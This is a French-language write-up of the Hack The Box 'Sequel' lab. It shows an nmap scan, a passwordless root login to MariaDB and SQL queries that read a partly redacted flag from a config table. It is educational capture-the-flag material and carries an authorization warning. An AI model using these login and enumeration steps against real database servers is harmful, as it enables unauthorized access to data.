---
title: "Sequel"
date: 2026-01-19
description: "Comment discuter avec une base de données?"
draft: false

# Tes taxonomies (correspondant à ton hugo.toml)
tags: ["Misconfiguration", "Database", "MariaDB", "Tier 1"]
categories: ["Writeups", "Hack The Box", "Starting Point"]
---

# Introduction

Bienvenue sur **Sequel**. Cette machine est un excellent exercice pour comprendre comment interagir avec le service **MariaDB** en ligne de commande. C’est un scénario assez simple, un administrateur a installé un serveur de base de données, mais il a oublié un “petit” détail… mettre un mot de passe au compte super-utilisateur (**root**).

>[!WARNING]
>Dans ce writeup, je ne publie pas directement le flag final, l’objectif est d’apprendre en pratiquant. Si vous voulez le flag, suivez les étapes sur la machine.

>[!CAUTION]
>**NOTE :** n’attaquez que des machines sur lesquelles vous avez l’autorisation (ex. machines HTB, ou lab perso). Respectez les règles de la plateforme.

## Vidéo Walkthrough

Je sortirais bientot un tuto vidéo, d'ici la tu peux aller checker ma chaine Youtube
{{< button href="https://www.youtube.com/@Raven_Breach/videos" target="_blank" >}}
{{< icon "youtube" >}} RavenBreach
{{< /button >}}

---

## Reconaissance
On commence par notre rituel habituel, le scan ``Nmap``. On veut savoir ce qui tourne et dans quelle version.

````bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.129.33.220

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-19 07:39 -0500
Nmap scan report for 10.129.33.220
Host is up (0.015s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, LongColumnFlag, ODBCClient, Speaks41ProtocolOld, ConnectWithDatabase, Speaks41ProtocolNew, SupportsTransactions, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, IgnoreSigpipes, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: V_X{%?QYLN%ic7%ST.%l
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.96 seconds
````

- ``-sC`` : Lance les scripts de détection par défaut (très utile pour voir si un service accepte les connexions anonymes).
- ``-sV`` : Détecte la version exacte du service.

Résultat du scan, On ne trouve qu’un seul port ouvert : le **3306**. Le service est **MariaDB** (version 5.5.5–10.3.27-MariaDB-0+deb10u1).

---

## Pré-Exploitation
### Installation du client
Pour pouvoir parler à la cible, il nous faut l’outil approprié sur notre machine locale. Si vous ne l’avez pas, installez le client **MySQL** (qui fonctionne avec mariaDB).

````bash
┌─[user@htb]─[~]
└──╼ [★]$ sudo apt update && sudo apt install mysql*
````

### Le test de la “porte ouverte”
En sécurité, avant de sortir les outils compliqués, on teste toujours la base. MariaDB utilise normalement un combo **utilisateur / mot de passe**. Mais est-ce que le compte **root** (celui qui a tous les droits) est protégé ?

````bash
┌──(kali㉿kali)-[~]
└─$ mysql -h  10.129.33.220 -u root

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 77
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
````

- ``-h`` : L'adresse IP de la cible.
- ``-u root`` : On tente de se connecter en tant qu'administrateur.

>[!TIP]
Si vous avez une erreur lié au SSL, utilisé le flag ``--skip-ssl`` a la fin de la commande

La connexion est acceptée immédiatement sans demander de mot de passe. On est dans le terminal MariaDB !

--- 

## Exploitation
Maintenant qu’on est à l’intérieur, il faut savoir naviguer. Le langage SQL utilise des commandes très spécifiques. Voici notre feuille de route :

### 1. Lister les bases de données
On veut voir quels sont les “classeurs” disponibles sur ce serveur.
````bash
MariaDB [(none)]> SHOW databases;

+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.017 sec)
````
On repère une base nommée **htb**. C'est clairement notre cible.

### 2. Entrer dans la base
C’est l’équivalent d’un cd dans un terminal.
````bash
MariaDB [(none)]> USE htb;

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]>
````

### 3. Lister les tables
Une base de données contient des tables (comme des feuilles Excel). Voyons ce qu’il y a dans **htb**.
````bash
MariaDB [htb]> SHOW tables;

+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.012 sec)
````
Le serveur nous renvoie deux tables : **config** et **users**

### 4. Extraire les données
C’est le moment de vérité. On va demander d’afficher tout le contenu de la table **config** pour voir si le flag s'y cache.
````bash
MariaDB [htb]> SELECT * FROM config;

+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4{...}da8                      |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.012 sec)
````

Et **boum** ! Le terminal nous affiche une ligne avec notre précieux flag : 7b4{…}da8

La machine est ***pwned*** !

<!-- ---

## Pour aller plus loin

### Script automatisé
Ce n'est pas encore fait mais je prévois de faire un script automatisé !

### Rapport professionnel
Ce n'est pas encore fait mais je prévois de faire un rapport professionnel ! -->